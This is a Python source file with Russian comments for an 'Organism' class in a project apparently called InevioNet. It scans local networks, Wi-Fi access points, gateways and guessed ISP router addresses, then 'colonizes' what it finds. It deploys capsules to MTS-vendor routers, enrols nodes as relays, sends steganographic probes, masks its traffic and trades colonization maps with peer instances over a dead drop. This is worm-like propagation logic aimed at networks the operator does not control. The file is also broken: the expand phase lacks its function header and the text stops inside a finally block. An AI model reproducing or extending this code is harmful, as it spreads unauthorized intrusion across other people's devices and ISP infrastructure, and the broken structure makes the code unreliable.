"""InevioNet Organism - P95.

Единый поток вместо 8 лупов.
Живой организм: пробуждается, ищет точки роста, колонизирует, растёт, учит.

Философия:
  Организм не сканирует сеть - он ЖИВЁТ.
  Каждый найденный узел = точка роста.
  Через каждую точку - разведчики идут ГЛУБЖЕ.

6 фаз:
  wake      - проснулся, осознал себя
  scout     - разведчики ищут ЛЮБЫЕ узлы
  assess    - что можно с найденным?
  colonize  - колонизирую (спора + феромон + капсула)
  expand    - через колонизированные - глубже
  teach     - обучаю то, что обучилось

Heartbeat адаптивный: 10-60 сек (быстро при росте, медленно в покое).
"""
import time
import json
import threading
from typing import Dict, List, Any, Optional
from collections import deque

from .core.logger import get_logger

logger = get_logger("inevionet.organism")


# Сокращённый список targets для traceroute (10 штук - быстро)
TRACEROUTE_TARGETS_FAST = [
    "8.8.8.8", "8.8.4.4",           # Google
    "1.1.1.1",                       # Cloudflare
    "77.88.8.8",                     # Yandex
    "9.9.9.9",                       # Quad9
    "ya.ru",                         # РФ
    "mts.ru",                        # МТС
    "google.com",                    # Мир
    "github.com",                    # GitHub
    "cloudflare.com",                # CF
]


class Organism:
    """Живой организм InevioNet.
    
    Заменяет 8 лупов одним потоком.
    Цель: КОЛОНИЗАЦИЯ сети (не поиск собрата, а поиск точки роста).
    """
    
    def __init__(self, net):
        self.net = net
        self.running = False
        self.heartbeat = 15  # базовый, адаптивный
        
        # === ПАМЯТЬ ОРГАНИЗМА ===
        self.memory = {
            "nodes": {},       # ip -> {ip, mac, vendor, type, ...}
            "colonized": set(),  # ip колонизированных
            "depth": {},       # ip -> глубина от root
            "routes": [],      # [(from_ip, to_ip, via, ts)]
            "taught": set(),   # node_id обученных
        }
        
        # === СТАТИСТИКА ===
        self.stats = {
            "cycles": 0,
            "scouts_sent": 0,
            "nodes_found": 0,
            "nodes_colonized": 0,
            "nodes_taught": 0,
            "nodes_relayed": 0,
            "nodes_capsuled": 0,
            "max_depth": 0,
            "stego_sent": 0,
            "mask_applied": 0,
            "webrtc_sent": 0,
            "industrial_probed": 0,
            "maps_merged": 0,
            "nodes_from_merge": 0,
            "started_at": time.time(),
        }
        
        # === АДАПТИВНЫЙ HEARTBEAT ===
        self._load = 0.0
        self._phase_log = deque(maxlen=200)
        self._lock = threading.Lock()

        # P95c: async traceroute (не блокирует scout)
        self._tr_result = []
        self._tr_thread = None
        self._tr_running = False
    
    def live(self):
        """Сердцебиение. Адаптивный такт."""
        self.running = True
        logger.info("[Organism] *** пробуждение ***")
        time.sleep(20)  # дать стартовать остальным
        
        while self.running and getattr(self.net, "_running", False):
            try:
                t0 = time.time()
                
                # === ВДОХ ===
                _t1 = time.time()
                self.wake()
                logger.info("[Organism] wake: %.1fs", time.time() - _t1)

                _t2 = time.time()
                found = self.scout()
                logger.info("[Organism] scout: %.1fs, found=%d (new)",
                            time.time() - _t2, len(found))

                # P95f: если новых нет - работаем с памятью
                if not found:
                    # Берём узлы из памяти - приоритет: не колонизированные, gateway, router
                    all_nodes = list(self.memory["nodes"].values())
                    # Сортируем: сначала gateway, потом router, потом всё остальное
                    all_nodes.sort(key=lambda n: (
                        not n.get("is_gateway", False),
                        not n.get("type") in ("router", "isp_router"),
                        n.get("ip", "") in self.memory["colonized"],
                    ))
                    # Batch 100, не все сразу
                    found = all_nodes[:100]
                    logger.info("[Organism] memory fallback: %d nodes (total in memory: %d)",
                                len(found), len(self.memory["nodes"]))

                _t3 = time.time()
                new_colonized = 0
                for node in found:
                    plan = self.assess(node)
                    if plan.get("action"):
                        was_colonized = node["ip"] in self.memory["colonized"]
                        self.colonize(node, plan)
                        if not was_colonized:
                            new_colonized += 1
                logger.info("[Organism] colonize: %.1fs, new=%d",
                            time.time() - _t3, new_colonized)

                # === ВЫДОХ ===
                # === P96-v2: COMMUNICATE через СВОИ каналы ===
                _t3b = time.time()
                self.communicate(found[:20])
                logger.info("[Organism] communicate: %.1fs", time.time() - _t3b)

                # === P97: MERGE карт ===
                _t3c = time.time()
                self.merge_phase()
                logger.info("[Organism] merge: %.1fs", time.time() - _t3c)

                _t4 = time.time()
                self.expand()
                logger.info("[Organism] expand: %.1fs", time.time() - _t4)

                _t5 = time.time()
                self.teach()
                logger.info("[Organism] teach: %.1fs", time.time() - _t5)

                with self._lock:
                    self.stats["cycles"] += 1
                elapsed = time.time() - t0
                logger.info("[Organism] *** cycle %d done in %.1fs, sleep=%ds ***",
                            self.stats["cycles"], elapsed, self._adaptive_sleep(0, len(found)))
                
                # === АДАПТИВНЫЙ ТАКТ ===
                sleep = self._adaptive_sleep(elapsed, len(found))
                time.sleep(sleep)
                
            except Exception as e:
                logger.error("[Organism] цикл: %s", e)
                time.sleep(5)
        
        logger.info("[Organism] *** сон ***")
    
    def stop(self):
        self.running = False
    
    def _adaptive_sleep(self, elapsed, found):
        """Адаптивный heartbeat: быстро при росте, медленно в покое."""
        if found > 0:
            self._load = min(1.0, self._load + 0.3)
        else:
            self._load = max(0.0, self._load - 0.1)
        base = 60 - int(self._load * 50)  # 10-60 сек
        return max(10, base - int(elapsed))
    
    # =================================================================
    # ФАЗА 1: WAKE
    # =================================================================
    
    def wake(self):
        """Проснулся, осознал себя."""
        # STUN (public IP)
        try:
            if hasattr(self.net, "_network_info_loop_once"):
                self.net._network_info_loop_once()
        except Exception as e:
            logger.debug("[Wake] stun: %s", e)
        
        # LocalMap
        try:
            if self.net.local_map:
                self.net.local_map.build()
        except Exception as e:
            logger.debug("[Wake] localmap: %s", e)
        
        # Seed publish (чтобы меня нашли)
        try:
            if hasattr(self.net, "_seed_refresh_loop_once"):
                self.net._seed_refresh_loop_once()
        except Exception as e:
            logger.debug("[Wake] seed: %s", e)
        
        self._log_phase("wake", 0)
    
    # =================================================================
    # ФАЗА 2: SCOUT
    # =================================================================
    
    def scout(self) -> List[Dict[str, Any]]:
        """Разведчики ищут ЛЮБЫЕ узлы. P95d: надёжные источники."""
        found = []
        seen_ips = set(self.memory["nodes"].keys())
        c_lan = c_mdns = c_router = c_tr = 0

        # === 1. LAN - multiple methods ===
        try:
            lm = self.net.local_map
            if lm:
                local = None
                # Пробуем разные методы
                for method_name in ("build", "scan", "detect", "refresh", "get_map"):
                    if hasattr(lm, method_name):
                        try:
                            local = getattr(lm, method_name)()
                            if local and local.get("devices"):
                                logger.info("[Scout] local_map.%s -> %d devices",
                                            method_name, len(local.get("devices", [])))
                                break
                        except Exception as e:
                            logger.debug("[Scout] local_map.%s: %s", method_name, e)
                # Fallback: может, свойства напрямую
                if not local or not local.get("devices"):
                    devices = getattr(lm, "devices", None)
                    if devices:
                        local = {"devices": devices if isinstance(devices, list) else list(devices)}
                        logger.info("[Scout] local_map.devices -> %d", len(local["devices"]))
                
                if local:
                    devices = local.get("devices", [])
                    # P95e: диагностика - что в devices?
                    logger.info("[Scout] devices type=%s, count=%d",
                                type(devices).__name__, len(devices))
                    if devices:
                        first = devices[0]
                        logger.info("[Scout] device[0] type=%s, repr=%s",
                                    type(first).__name__, repr(first)[:200])
                    # Обрабатываем разные форматы
                    for dev in devices:
                        # Формат 1: dict с "ip"
                        if isinstance(dev, dict):
                            ip = dev.get("ip") or dev.get("address") or dev.get("host") or dev.get("addr")
                            mac = dev.get("mac", "")
                            vendor = dev.get("vendor", "")
                        # Формат 2: объект с .ip
                        elif hasattr(dev, "ip"):
                            ip = getattr(dev, "ip", None)
                            mac = getattr(dev, "mac", "")
                            vendor = getattr(dev, "vendor", "")
                        # Формат 3: строка (ip)
                        elif isinstance(dev, str):
                            ip = dev
                            mac = ""
                            vendor = ""
                        else:
                            logger.warning("[Scout] unknown device format: %r", dev)
                            continue
                        
                        if ip and ip not in seen_ips:
                            found.append({
                                "ip": str(ip),
                                "mac": str(mac) if mac else "",
                                "vendor": str(vendor) if vendor else "",
                                "type": "lan_device", "source": "arp", "depth": 1,
                            })
                            c_lan += 1
                            seen_ips.add(ip)
                            logger.info("[Scout] +lan_device %s", ip)
        except Exception as e:
            logger.debug("[Scout] lan: %s", e)

        # === 1.5 P96-v2: Steganography probe для LAN-устройств ===
        try:
            c_stego = 0
            for node in list(found):
                if node.get("type") in ("lan_device", "service"):
                    ip = node["ip"]
                    if self._stego_send(ip, {"type": "probe"}):
                        node["stego_ok"] = True
                        c_stego += 1
            if c_stego:
                logger.info("[Scout] stego_ok=%d", c_stego)
        except Exception as e:
            logger.debug("[Scout] stego: %s", e)

        # === 2. mDNS/SSDP - async-friendly (короткий timeout) ===
        try:
            ld = self.net.local_discovery
            if ld:
                mdns = None
                for method_name in ("scan_all", "scan", "discover"):
                    if hasattr(ld, method_name):
                        try:
                            mdns = getattr(ld, method_name)(timeout=1.0)
                            break
                        except TypeError:
                            try:
                                mdns = getattr(ld, method_name)()
                                break
                            except Exception:
                                pass
                        except Exception as e:
                            logger.debug("[Scout] local_discovery.%s: %s", method_name, e)
                if mdns:
                    for dev in mdns.get("devices", []):
                        ip = dev.get("ip") if isinstance(dev, dict) else None
                        if ip and ip not in seen_ips:
                            found.append({
                                "ip": ip, "type": "service",
                                "service": dev.get("server") or dev.get("source"),
                                "source": "mdns", "depth": 1,
                            })
                            c_mdns += 1
                            seen_ips.add(ip)
        except Exception as e:
            logger.debug("[Scout] mdns: %s", e)

        # === 3. Роутер (gateway) - multiple methods ===
        try:
            lm = self.net.local_map
            router_ip = None
            if lm:
                # Свойства
                for attr in ("router_ip", "gateway", "gateway_ip", "router"):
                    if hasattr(lm, attr):
                        v = getattr(lm, attr)
                        if v and isinstance(v, str):
                            router_ip = v
                            break
                # Методы
                if not router_ip:
                    for m_name in ("get_router_ip", "get_gateway", "detect_router"):
                        if hasattr(lm, m_name):
                            try:
                                v = getattr(lm, m_name)()
                                if v and isinstance(v, str):
                                    router_ip = v
                                    break
                            except Exception:
                                pass
                # Из devices
                if not router_ip and hasattr(lm, "devices"):
                    for d in (lm.devices or []):
                        if isinstance(d, dict) and d.get("type") == "router":
                            router_ip = d.get("ip")
                            break
            
            # Fallback: стандартные gateway
            if not router_ip:
                for guess in ("192.168.1.1", "192.168.0.1", "10.0.0.1"):
                    if guess not in seen_ips:
                        router_ip = guess
                        break
            
            if router_ip and router_ip not in seen_ips:
                found.append({
                    "ip": router_ip, "type": "router",
                    "source": "gateway", "depth": 1, "is_gateway": True,
                })
                c_router += 1
                seen_ips.add(router_ip)
        except Exception as e:
            logger.debug("[Scout] router: %s", e)

        # === 4. Traceroute - async, берём предыдущий результат ===
        if not self._tr_running and self.net.traceroute_scan:
            self._tr_running = True
            self._tr_thread = threading.Thread(
                target=self._tr_worker, daemon=True, name="organism_traceroute")
            self._tr_thread.start()
        for hop in self._tr_result:
            ip = hop.get("ip")
            if ip and ip not in seen_ips:
                found.append({
                    "ip": ip, "type": "isp_router",
                    "source": "traceroute", "depth": 2,
                })
                c_tr += 1
                seen_ips.add(ip)
        self._tr_result = []

        # === 5. Собственные InevioNet-узлы (trusted hosts) ===
        try:
            if self.net.trusted_hosts:
                for h in self.net.trusted_hosts.list_all():
                    host = h.get("host", "")
                    if ":" in host:
                        ip = host.split(":")[0]
                    else:
                        ip = host
                    if ip and ip not in seen_ips:
                        found.append({
                            "ip": ip, "type": "inevionet",
                            "node_id": h.get("label"),
                            "source": "trusted", "depth": 1,
                        })
                        seen_ips.add(ip)
        except Exception as e:
            logger.debug("[Scout] trusted: %s", e)

        # === 6. WiFi-соседи (RF scan) - как виртуальные узлы ===
        try:
            rf = getattr(self.net, "_rf_scanner", None) or getattr(self.net, "rf_scanner", None)
            if rf and hasattr(rf, "scan"):
                signals = rf.scan() or []
                c_wifi = 0
                for sig in signals:
                    bssid = sig.get("bssid") or sig.get("mac")
                    if bssid and bssid not in seen_ips:
                        found.append({
                            "ip": bssid,  # MAC как ID
                            "type": "wifi_ap",
                            "ssid": sig.get("ssid", ""),
                            "rssi": sig.get("rssi", -70),
                            "vendor": sig.get("vendor", ""),
                            "source": "rf", "depth": 1,
                        })
                        seen_ips.add(bssid)
                        c_wifi += 1
                if c_wifi:
                    logger.info("[Scout] +wifi=%d", c_wifi)
        except Exception as e:
            logger.debug("[Scout] rf: %s", e)

        # === 7. ISP-подсети (через уже известные ISP-роутеры) ===
        try:
            c_isp = 0
            for ip, node in list(self.memory["nodes"].items()):
                if node.get("type") == "isp_router" and node.get("source") == "traceroute":
                    # Стандартные подсети для ISP
                    if "." in ip:
                        parts = ip.split(".")
                        subnet_prefix = f"{parts[0]}.{parts[1]}.{parts[2]}"
                        # Проверяем соседние IP (только несколько)
                        for last in ("1", "254"):
                            guess_ip = f"{subnet_prefix}.{last}"
                            if guess_ip not in seen_ips:
                                found.append({
                                    "ip": guess_ip, "type": "isp_router",
                                    "source": "isp_guess", "depth": 3,
                                })
                                seen_ips.add(guess_ip)
                                c_isp += 1
                                if c_isp > 20:  # ограничение
                                    break
                    if c_isp > 20:
                        break
        except Exception as e:
            logger.debug("[Scout] isp_guess: %s", e)

        # Регистрируем в памяти
        with self._lock:
            for node in found:
                # P98-fix: сохранить nlp_* поля если уже есть
                _existing = self.memory["nodes"].get(node["ip"], {})
                _entry = {
                    **node,
                    "discovered_at": _existing.get("discovered_at", time.time()),
                    "last_seen": time.time(),
                    "score": _existing.get("score", 0.0),
                    "can_teach": _existing.get("can_teach", False),
                    "can_relay": _existing.get("can_relay", False),
                    "can_capsule": _existing.get("can_capsule", False),
                }
                # Сохранить NLP-поля
                for _k in ("nlp_plan", "nlp_confidence", "nlp_rapport",
                           "nlp_controllable", "nlp_leading"):
                    if _k in _existing and _k not in _entry:
                        _entry[_k] = _existing[_k]
                self.memory["nodes"][node["ip"]] = _entry
            self.stats["scouts_sent"] += 1
            self.stats["nodes_found"] += len(found)

        # P98-fix: НЛП-анализ через memory["nodes"] (после регистрации)
        try:
            from .nlp.pipeline import spore_analyze_node
            nlp_count = 0
            analyzed = 0
            with self._lock:
                for ip, node in list(self.memory["nodes"].items()):
                    # Пропускаем уже проанализированные
                    if node.get("nlp_plan"):
                        continue
                    try:
                        nlp_res = spore_analyze_node(node)
                        node["nlp_plan"] = nlp_res.get("plan", "route")
                        node["nlp_confidence"] = nlp_res.get("confidence", 0.5)
                        node["nlp_rapport"] = nlp_res.get("rapport")
                        node["nlp_controllable"] = nlp_res.get("controllable")
                        node["nlp_leading"] = nlp_res.get("leading")
                        analyzed += 1
                        if node["nlp_plan"] != "route":
                            nlp_count += 1
                    except Exception as e:
                        logger.debug("[NLP] %s: %s", ip, e)
            if analyzed:
                logger.info("[NLP] analyzed %d nodes in memory, non-route=%d",
                            analyzed, nlp_count)
        except ImportError:
            logger.debug("[NLP] pipeline not available")
        except Exception as e:
            logger.debug("[NLP] scout: %s", e)

        new_count = len(found)
        total_in_memory = len(self.memory["nodes"])
        logger.info("[Scout] new=%d (lan=%d mdns=%d router=%d traceroute=%d trusted=%d wifi=%d isp=%d), "
                    "total_in_memory=%d",
                    new_count, c_lan, c_mdns, c_router, c_tr,
                    len([f for f in found if f.get("source") == "trusted"]),
                    len([f for f in found if f.get("source") == "rf"]),
                    len([f for f in found if f.get("source") == "isp_guess"]),
                    total_in_memory)
        self._log_phase("scout", 0, f"new={new_count}, memory={total_in_memory}")
        return found


    # =================================================================
    # ФАЗА 3: ASSESS
    # =================================================================
    
    def assess(self, node: Dict[str, Any]) -> Dict[str, Any]:
        """P98: НЛП-план имеет приоритет, fallback на P95h."""
        # P98: если есть NLP-план - используем
        if node.get("nlp_plan"):
            plan = node["nlp_plan"]
            conf = node.get("nlp_confidence", 0.5)
            if plan in ("capsule", "teach", "relay", "route"):
                logger.debug("[Assess] %s -> NLP plan: %s (conf=%.2f)",
                             node.get("ip"), plan, conf)
                return {"action": plan, "reason": "nlp",
                        "priority": conf, "method": "nlp"}
            if plan == "skip":
                return {"action": None, "reason": "nlp_skip"}
        
        """P95h: что можно с узлом?
        
        Приоритеты:
          capsule - MTS-роутер (можно капсулу)
          teach   - LAN-устройство (можно учить)
          relay   - gateway / ISP-роутер (можно реле)
          route   - всё остальное (путь дальше)
        """
        ip = node["ip"]
        node_type = node.get("type", "unknown")
        vendor = (node.get("vendor") or "").lower()
        source = node.get("source", "")
        
        # === CAPSULE: MTS-роутер ===
        can_capsule = False
        if node_type == "router" and ("mts" in vendor or "mts" in ip):
            can_capsule = True
        
        # === TEACH: LAN-устройства (они могут быть InevioNet или станут) ===
        can_teach = False
        if node_type in ("lan_device", "service"):
            can_teach = True
        if source == "trusted":
            can_teach = True  # Уже InevioNet
        
        # === RELAY: gateway + ISP-роутеры ===
        can_relay = False
        if node.get("is_gateway"):
            can_relay = True
        if node_type == "isp_router":
            can_relay = True
        
        # === ROUTE: всё что router/isp ===
        can_route = node_type in ("router", "isp_router") or node.get("is_gateway")
        
        # Приоритет
        actions = []
        if can_capsule: actions.append(("capsule", 0.95, "MTS -> deploy"))
        if can_teach:   actions.append(("teach", 0.85, "lan -> teach"))
        if can_relay:   actions.append(("relay", 0.75, "gateway/isp -> relay"))
        if can_route:   actions.append(("route", 0.5, "route"))
        
        if not actions:
            return {"action": None, "reason": "непригоден"}
        
        # Берём максимальный приоритет
        actions.sort(key=lambda x: -x[1])
        action, priority, reason = actions[0]
        
        # Обновляем память
        with self._lock:
            if ip in self.memory["nodes"]:
                self.memory["nodes"][ip].update({
                    "can_teach": can_teach, "can_relay": can_relay,
                    "can_capsule": can_capsule, "score": priority,
                })
        
        return {"action": action, "reason": reason, "priority": priority}


    # =================================================================
    # ФАЗА 4: COLONIZE
    # =================================================================
    
    def colonize(self, node: Dict[str, Any], plan: Dict[str, Any]):
        """Колонизирую найденный узел."""
        ip = node["ip"]
        action = plan["action"]
        
        if action == "teach":
            self._colonize_teach(node)
        elif action == "relay":
            self._colonize_relay(node)
        elif action == "capsule":
            self._colonize_capsule(node)
        elif action == "route":
            self._colonize_route(node)
        
        # Феромон
        try:
            if hasattr(self.net.mycelium, "pheromones"):
                self.net.mycelium.pheromones.mark_transit(
                    source=self.net.node_id, dest=ip, via=ip,
                    path=[ip], success=True)
        except Exception as e:
            logger.debug("[Colonize] pheromone: %s", e)
        
        # Спора
        try:
            if hasattr(self.net.mycelium, "spores"):
                spore = self.net.mycelium.spores.create(
                    node_id=self.net.node_id, target_network=ip,
                    method=action, viability=0.8)
        except Exception as e:
            logger.debug("[Colonize] spore: %s", e)
        
        with self._lock:
            already = ip in self.memory["colonized"]
            self.memory["colonized"].add(ip)
            if not already:
                self.stats["nodes_colonized"] += 1
            my_depth = self.memory["depth"].get(ip, 0)
            new_depth = my_depth + 1
            self.memory["depth"][ip] = new_depth
            if new_depth > self.stats["max_depth"]:
                self.stats["max_depth"] = new_depth
        
        # P96-v2: маскировка
        try:
            if self._mask_traffic():
                with self._lock:
                    self.stats["mask_applied"] = self.stats.get("mask_applied", 0) + 1
        except Exception as e:
            logger.debug("[Colonize] mask: %s", e)
        
        self._log_phase("colonize", 0, f"{ip} -> {action}")
    
    def _colonize_teach(self, node):
        """P95h: реальный teach через SuperNode + spore + evolution."""
        ip = node["ip"]
        if ip in self.memory["taught"]:
            return
        try:
            taught_via = []
            # 1. SuperNode
            sn = getattr(self.net, "super_node", None)
            if sn:
                try:
                    for m in ("promote", "mark_super", "add_super", "teach"):
                        if hasattr(sn, m):
                            getattr(sn, m)(ip)
                            taught_via.append("super_node")
                            break
                except Exception:
                    pass
            # 2. Spores - создать спору с профилем
            spores = getattr(getattr(self.net, "mycelium", None), "spores", None)
            if spores:
                try:
                    spore = spores.create(
                        node_id=self.net.node_id,
                        target_network="taught_" + ip,
                        method="teach", viability=0.9)
                    # Прикрепляем профиль
                    if hasattr(spores, "set_profile"):
                        prof = {"network_type": "taught", "ip": ip}
                        spores.set_profile(spore.spore_id, prof)
                    taught_via.append("spore")
                except Exception:
                    pass
            # 3. Evolution
            evo = getattr(self.net, "evolution", None)
            if evo:
                try:
                    for m in ("record_success", "mark_success", "add_fitness"):
                        if hasattr(evo, m):
                            getattr(evo, m)(ip)
                            taught_via.append("evolution")
                            break
                except Exception:
                    pass
            # 4. Pheromone - пометить как путь знания
            try:
                if hasattr(self.net.mycelium, "pheromones"):
                    self.net.mycelium.pheromones.mark_transit(
                        source=self.net.node_id, dest="taught_" + ip,
                        via=ip, path=[ip], success=True)
            except Exception:
                pass
            
            self.memory["taught"].add(ip)
            with self._lock:
                self.stats["nodes_taught"] += 1
            logger.info("[Teach] %s -> %s", ip, ",".join(taught_via) or "marked")
        except Exception as e:
            logger.debug("[Teach] %s: %s", ip, e)
    
    def _colonize_relay(self, node):
        """P95h: реальный relay через pheromone + gravity + relay_node."""
        ip = node["ip"]
        # Не повторяем
        if ip in self.memory.get("relayed_ips", set()):
            return
        try:
            # 1. Pheromone - путь через relay
            if hasattr(self.net.mycelium, "pheromones"):
                try:
                    self.net.mycelium.pheromones.mark_transit(
                        source=self.net.node_id, dest="relay_" + ip,
                        via=ip, path=[ip], success=True)
                except Exception:
                    pass
            # 2. Gravity - масса
            if hasattr(self.net, "gravity") and self.net.gravity:
                try:
                    self.net.gravity.add_mass(ip, 0.5)
                except Exception:
                    pass
            # 3. Relay через RelayNode
            if hasattr(self.net, "relay") and self.net.relay:
                try:
                    if hasattr(self.net.relay, "add_peer"):
                        self.net.relay.add_peer(ip, 9100)
                    elif hasattr(self.net.relay, "register_peer"):
                        self.net.relay.register_peer(ip, 9100)
                except Exception:
                    pass
            # Запоминаем
            if "relayed_ips" not in self.memory:
                self.memory["relayed_ips"] = set()
            self.memory["relayed_ips"].add(ip)
            with self._lock:
                self.stats["nodes_relayed"] += 1
            logger.info("[Relay] %s -> relayed", ip)
        except Exception as e:
            logger.debug("[Relay] %s: %s", ip, e)
    
    def _colonize_capsule(self, node):
        """P95h: capsule deploy - не повторять успешно доставленные."""
        ip = node["ip"]
        # Не повторяем для одного и того же IP
        if ip in self.memory.get("capsuled_ips", set()):
            return
        try:
            # Реальная попытка deploy (если есть deployer)
            deployed = False
            if hasattr(self.net, "capsule_deployer") and self.net.capsule_deployer:
                try:
                    # Проверяем, есть ли build + deploy
                    if hasattr(self.net, "capsule_builder") and self.net.capsule_builder:
                        capsule = self.net.capsule_builder.build()
                        if hasattr(self.net.capsule_deployer, "deploy"):
                            result = self.net.capsule_deployer.deploy(
                                target=ip, capsule=capsule)
                            deployed = bool(result and result.get("success"))
                except Exception as e:
                    logger.debug("[Capsule] deploy %s: %s", ip, e)
            
            # Запоминаем, что пытались (не повторяем)
            if "capsuled_ips" not in self.memory:
                self.memory["capsuled_ips"] = set()
            self.memory["capsuled_ips"].add(ip)
            
            with self._lock:
                self.stats["nodes_capsuled"] += 1
            logger.info("[Capsule] %s -> %s", ip, "deployed" if deployed else "attempted")
        except Exception as e:
            logger.debug("[Capsule] %s: %s", ip, e)
    
    def _colonize_route(self, node):
        """Прокладываем маршрут через узел."""
        ip = node["ip"]
        try:
            routes = self.memory["routes"]
            routes.append((self.net.node_id, ip, ip, time.time()))
            if len(routes) > 500:
                self.memory["routes"] = routes[-500:]
        except Exception as e:
            logger.debug("[Route] %s: %s", ip, e)
    
    # =================================================================
    # ФАЗА 5: EXPAND
    # =================================================================
    
    # =================================================================
    # P97: MERGE КАРТ (между организмами в разных сетях)
    # =================================================================

    def export_map(self):
        """P97: экспорт карты для отправки другому организму."""
        return {
            "node_id": self.net.node_id,
            "ts": time.time(),
            "nodes": list(self.memory["nodes"].values()),
            "colonized": list(self.memory["colonized"]),
            "depth": dict(self.memory["depth"]),
            "taught": list(self.memory["taught"]),
            "relayed": list(self.memory.get("relayed_ips", set())),
            "capsuled": list(self.memory.get("capsuled_ips", set())),
            "stats": {
                "nodes_found": self.stats.get("nodes_found", 0),
                "nodes_taught": self.stats.get("nodes_taught", 0),
                "nodes_relayed": self.stats.get("nodes_relayed", 0),
                "max_depth": self.stats.get("max_depth", 0),
            },
        }

    def merge_remote_map(self, remote_map):
        """P97: merge карты от другого организма."""
        if not remote_map or not isinstance(remote_map, dict):
            return 0
        remote_id = remote_map.get("node_id", "")
        if remote_id == self.net.node_id:
            return 0  # это мы
        added = 0
        updated = 0
        try:
            # === Nodes ===
            for node in remote_map.get("nodes", []):
                ip = node.get("ip")
                if not ip:
                    continue
                if ip not in self.memory["nodes"]:
                    # Новый узел от другого организма
                    node = dict(node)
                    node["via_organism"] = remote_id
                    node["source"] = "merge:" + str(node.get("source", "?"))
                    node["depth"] = int(node.get("depth", 1)) + 1
                    node["merged_at"] = time.time()
                    with self._lock:
                        self.memory["nodes"][ip] = node
                    added += 1
                else:
                    # Обновить last_seen
                    with self._lock:
                        self.memory["nodes"][ip]["last_seen"] = time.time()
                        self.memory["nodes"][ip]["via_organism"] = remote_id
                    updated += 1
            
            # === Colonized ===
            remote_colonized = set(remote_map.get("colonized", []))
            before = len(self.memory["colonized"])
            with self._lock:
                self.memory["colonized"].update(remote_colonized)
            colonized_added = len(self.memory["colonized"]) - before
            
            # === Taught ===
            remote_taught = set(remote_map.get("taught", []))
            with self._lock:
                self.memory["taught"].update(remote_taught)
            
            # === Relayed ===
            remote_relayed = set(remote_map.get("relayed", []))
            if "relayed_ips" not in self.memory:
                self.memory["relayed_ips"] = set()
            with self._lock:
                self.memory["relayed_ips"].update(remote_relayed)
            
            # === Depth ===
            for ip, d in (remote_map.get("depth") or {}).items():
                cur = self.memory["depth"].get(ip, 999)
                new_d = int(d) + 1
                if new_d < cur:
                    self.memory["depth"][ip] = new_d
                    if new_d > self.stats.get("max_depth", 0):
                        self.stats["max_depth"] = new_d
            
            # === Stats ===
            with self._lock:
                self.stats["maps_merged"] = self.stats.get("maps_merged", 0) + 1
                self.stats["nodes_from_merge"] = self.stats.get("nodes_from_merge", 0) + added
            
            logger.info("[Merge] from %s: +%d new, ~%d upd, colonized+%d",
                        remote_id, added, updated, colonized_added)
            return added
        except Exception as e:
            logger.error("[Merge] %s: %s", remote_id, e)
            return 0

    def merge_phase(self):
        """P97: фаза merge - экспорт + broadcast + приём."""
        try:
            # 1. Экспорт своей карты
            my_map = self.export_map()
            
            # 2. Публикация через dead_drop
            if hasattr(self.net, "dead_drop") and self.net.dead_drop:
                try:
                    self.net.dead_drop.queue_send(
                        receiver="broadcast",
                        message=json.dumps(my_map, default=str))
                except Exception as e:
                    logger.debug("[Merge] broadcast: %s", e)
            
            # 3. Приём чужих карт из dead_drop inbox
            if hasattr(self.net, "dead_drop") and self.net.dead_drop:
                try:
                    inbox = self.net.dead_drop.get_inbox() or []
                    merged = 0
                    for msg in inbox[-50:]:
                        rcv = msg.get("receiver", "")
                        # P97-fix: принимаем broadcast и свои
                        if rcv not in ("broadcast", self.net.node_id, ""):
                            continue
                        try:
                            remote_map = json.loads(msg.get("message", "{}"))
                            if isinstance(remote_map, dict) and "node_id" in remote_map:
                                n = self.merge_remote_map(remote_map)
                                merged += n
                        except Exception:
                            pass
                    if merged:
                        logger.info("[Merge] merged +%d nodes from inbox", merged)
                except Exception as e:
                    logger.debug("[Merge] inbox: %s", e)
            
            self._log_phase("merge", 0, f"maps_merged={self.stats.get('maps_merged', 0)}")
        except Exception as e:
            logger.debug("[Merge] phase: %s", e)

        """Через колонизированные узлы - глубже."""
        new_found = []
        
        for ip in list(self.memory["colonized"]):
            node = self.memory["nodes"].get(ip, {})
            if not (node.get("is_gateway") or node.get("type") in ("router", "isp_router")):
                continue
            
            try:
                neighbors = self._probe_neighbors_via(ip)
                for n in neighbors:
                    n_ip = n["ip"]
                    if n_ip not in self.memory["nodes"]:
                        n["depth"] = self.memory["depth"].get(ip, 1) + 1
                        n["via"] = ip
                        n["discovered_at"] = time.time()
                        with self._lock:
                            self.memory["nodes"][n_ip] = n
                        new_found.append(n)
            except Exception as e:
                logger.debug("[Expand] %s: %s", ip, e)
        
        if new_found:
            with self._lock:
                self.stats["nodes_found"] += len(new_found)
            self._log_phase("expand", 0, f"new={len(new_found)}")
        return new_found
    
    def _probe_neighbors_via(self, gateway_ip):
        neighbors = []
        try:
            if not hasattr(self.net, "recursive_probe") or not self.net.recursive_probe:
                return neighbors
            # Стандартные подсети
            for subnet in ("192.168.1.0/24", "192.168.0.0/24"):
                try:
                    r = self.net.recursive_probe.probe_subnet(subnet, depth=0) or {}
                    for n in r.get("inevionet_nodes", []):
                        neighbors.append({"ip": n["ip"], "type": "inevionet",
                                          "source": "recursive"})
                    for d in r.get("devices", []):
                        neighbors.append({"ip": d["ip"], "type": "lan_device",
                                          "source": "recursive_arp"})
                except Exception:
                    pass
        except Exception as e:
            logger.debug("[Expand] probe %s: %s", gateway_ip, e)
        return neighbors
    
    # =================================================================
    # ФАЗА 6: TEACH
    # =================================================================
    
    def teach(self):
        """Обучаю: SuperNode + evolution + masking."""
        try:
            if hasattr(self.net, "_supernode_loop_once"):
                self.net._supernode_loop_once()
        except Exception as e:
            logger.debug("[Teach] supernode: %s", e)
        
        try:
            if hasattr(self.net, "_evolution_once"):
                self.net._evolution_once()
        except Exception as e:
            logger.debug("[Teach] evolution: %s", e)
        
        try:
            if hasattr(self.net, "_multi_channel_loop_once"):
                self.net._multi_channel_loop_once()
        except Exception as e:
            logger.debug("[Teach] masking: %s", e)
        
        self._log_phase("teach", 0, f"taught={len(self.memory['taught'])}")
    
    # =================================================================
    # УТИЛИТЫ
    # =================================================================
    
    def _tr_worker(self):
        """P95c: traceroute в фоне - не блокирует scout."""
        try:
            logger.info("[Scout/tr] traceroute started (%d targets)",
                        len(TRACEROUTE_TARGETS_FAST))
            t0 = time.time()
            tr = self.net.traceroute_scan.scan_multi(
                targets=TRACEROUTE_TARGETS_FAST) or {}
            hops = tr.get("hops", [])
            self._tr_result = hops
            logger.info("[Scout/tr] traceroute done: %d hops in %.1fs",
                        len(hops), time.time() - t0)
        except Exception as e:
            logger.warning("[Scout/tr] traceroute error: %s", e)
            self._tr_result = []
        finally:
